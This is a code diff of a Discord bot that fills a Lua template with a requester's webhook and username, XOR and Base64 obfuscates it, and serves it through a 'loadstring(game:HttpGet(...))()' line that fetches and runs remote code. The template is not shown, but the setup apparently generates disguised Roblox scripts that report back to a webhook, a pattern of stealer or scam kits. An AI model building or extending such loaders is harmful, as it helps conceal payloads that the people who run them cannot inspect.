@@ -1,33 +1,60 @@
 const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
 const axios = require('axios');
-const FormData = require('form-data');
 const fs = require('fs');
 const path = require('path');
 const express = require('express');
+const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
+
+// ----- Global script store (in‑memory) -----
+const scripts = new Map(); // id -> { content, expires }
+const SCRIPT_TTL = 60 * 60 * 1000; // 1 hour
 
 // ----- Web server -----
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+// Serve obfuscated scripts
+app.get('/script/:id', (req, res) => {
+    const id = req.params.id;
+    const entry = scripts.get(id);
+    if (!entry || Date.now() > entry.expires) {
+        scripts.delete(id);
+        return res.status(404).send('Script not found or expired.');
+    }
+    res.set('Content-Type', 'text/plain');
+    res.send(entry.content);
+});
+
+// Health check
 app.get('/', (req, res) => res.send('Bot is alive!'));
+
 app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
 
-// ----- Self‑ping -----
+// ----- Cleanup expired scripts every 10 minutes -----
+setInterval(() => {
+    const now = Date.now();
+    for (const [id, entry] of scripts) {
+        if (now > entry.expires) {
+            scripts.delete(id);
+        }
+    }
+}, 10 * 60 * 1000);
+
+// ----- Self‑ping (keep Render awake) -----
 const RENDER_URL = process.env.RENDER_URL;
 if (RENDER_URL) {
-  console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
-  setInterval(() => {
-    axios.get(RENDER_URL).catch(() => {});
-  }, 4 * 60 * 1000);
-  setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
+    console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
+    setInterval(() => {
+        axios.get(RENDER_URL).catch(() => {});
+    }, 4 * 60 * 1000);
+    setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
 } else {
-  console.log('⚠️ RENDER_URL not set – self‑ping disabled.');
+    console.log('⚠️ RENDER_URL not set – self‑ping disabled.');
 }
 
 // ----- Discord Bot -----
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
-
-const OBFUSCATE_URL = 'https://goofyscator.lua.cz/api/obfuscate';
 
 client.once('ready', () => {
     console.log(`✅ Logged in as ${client.user.tag}`);
@@ -69,7 +96,7 @@ client.on('interactionCreate', async interaction => {
     }
 
     try {
-        // ----- Read template.lua -----
+        // ----- Read template -----
         const templatePath = path.join(__dirname, 'template.lua');
         if (!fs.existsSync(templatePath)) {
             return interaction.editReply({ 
@@ -80,39 +107,24 @@ client.on('interactionCreate', async interaction => {
         template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
         template = template.replace(/\{\{USERNAME\}\}/g, username);
 
-        // ----- Obfuscate via Goofyscator (or fallback) -----
-        let obfuscatedScript;
-        try {
-            const form = new FormData();
-            form.append('code', template);
-            form.append('level', 'max');
+        // ----- Obfuscate locally (XOR + Base64) -----
+        const obfuscated = obfuscateScript(template);
 
-            const response = await axios.post(OBFUSCATE_URL, form, {
-                headers: form.getHeaders(),
-                timeout: 30000
-            });
-            if (response.data && response.data.obfuscated) {
-                obfuscatedScript = response.data.obfuscated;
-            } else {
-                throw new Error('Goofyscator returned unexpected response');
-            }
-        } catch (obfError) {
-            console.error('Obfuscation error:', obfError.message);
-            // Fallback: Base64
-            const encoded = Buffer.from(template, 'utf8').toString('base64');
-            obfuscatedScript = `-- Fallback obfuscation\nloadstring(game:HttpGet("data:text/plain;base64," .. "${encoded}"))()`;
-        }
+        // ----- Store script with unique ID -----
+        const id = uuidv4();
+        scripts.set(id, {
+            content: obfuscated,
+            expires: Date.now() + SCRIPT_TTL
+        });
 
-        // ----- Upload to Pastebin -----
-        const pastebinRawUrl = await uploadToPastebin(obfuscatedScript, username);
+        // ----- Build loadstring (points to this bot) -----
+        const baseUrl = RENDER_URL || `http://localhost:${PORT}`;
+        const loadstringLine = `loadstring(game:HttpGet("${baseUrl}/script/${id}"))()`;
 
-        // ----- Build loadstring -----
-        const loadstringLine = `loadstring(game:HttpGet("${pastebinRawUrl}"))()`;
-
-        // ----- Reply with embed (show the loadstring) -----
+        // ----- Reply -----
         const embed = new EmbedBuilder()
             .setColor(0x00FF00)
-            .setTitle('✅ Script Generated (Goofyscated)')
+            .setTitle('✅ Script Generated (Obfuscated)')
             .setDescription(`**Game:** ${game}\n**User:** ${username}`)
             .addFields(
                 { 
@@ -121,13 +133,8 @@ client.on('interactionCreate', async interaction => {
                     inline: false 
                 },
                 { 
-                    name: '📦 Direct Link (for reference)', 
-                    value: pastebinRawUrl,
-                    inline: false 
-                },
-                { 
                     name: '🔒 Obfuscation', 
-                    value: 'Goofyscator (max level – VM + anti‑tamper)',
+                    value: 'XOR + Base64 (lightweight, no external API)',
                     inline: false 
                 },
                 { 
@@ -140,7 +147,7 @@ client.on('interactionCreate', async interaction => {
 
         await interaction.editReply({ embeds: [embed] });
 
-        // ----- Self‑ping -----
+        // ----- Self‑ping after command -----
         if (RENDER_URL) {
             axios.get(RENDER_URL).catch(() => {});
         }
@@ -151,33 +158,35 @@ client.on('interactionCreate', async interaction => {
     }
 });
 
-// ----- Pastebin Upload (returns RAW URL) -----
-async function uploadToPastebin(content, username) {
-    const apiKey = process.env.PASTEBIN_API_KEY;
-    if (!apiKey) {
-        throw new Error('PASTEBIN_API_KEY not set. Please add it to .env');
+// ----- Local obfuscator (XOR + Base64) -----
+function obfuscateScript(raw) {
+    // 1. Generate random XOR key (1-255)
+    const key = Math.floor(Math.random() * 254) + 1;
+
+    // 2. XOR encode the entire script
+    let xorEncoded = '';
+    for (let i = 0; i < raw.length; i++) {
+        xorEncoded += String.fromCharCode(raw.charCodeAt(i) ^ key);
     }
 
-    const pasteData = new URLSearchParams({
-        api_dev_key: apiKey,
-        api_option: 'paste',
-        api_paste_code: content,
-        api_paste_name: `Exodus_${username}_${Date.now()}.lua`,
-        api_paste_format: 'lua',
-        api_paste_private: 1,
-        api_paste_expire_date: '1D'
-    });
+    // 3. Base64 encode the XORed string
+    const base64 = Buffer.from(xorEncoded, 'binary').toString('base64');
 
-    const response = await axios.post('https://pastebin.com/api/api_post.php', pasteData);
-    const pasteUrl = response.data;
+    // 4. Build a loader that decodes and runs it
+    return `-- Obfuscated with XOR + Base64
+local function decode(str, key)
+    local result = ""
+    for i = 1, #str do
+        result = result .. string.char(string.byte(str, i) ~ key)
+    end
+    return result
+end
 
-    if (!pasteUrl.startsWith('https://pastebin.com/')) {
-        throw new Error('Pastebin upload failed: ' + pasteUrl);
-    }
-
-    // Convert to raw URL
-    const pasteId = pasteUrl.split('/').pop();
-    return `https://pastebin.com/raw/${pasteId}`;
+local encoded = "${base64}"
+local key = ${key}
+local decoded = decode(encoded, key)
+loadstring(decoded)()
+`;
 }
 
 client.login(process.env.DISCORD_TOKEN);
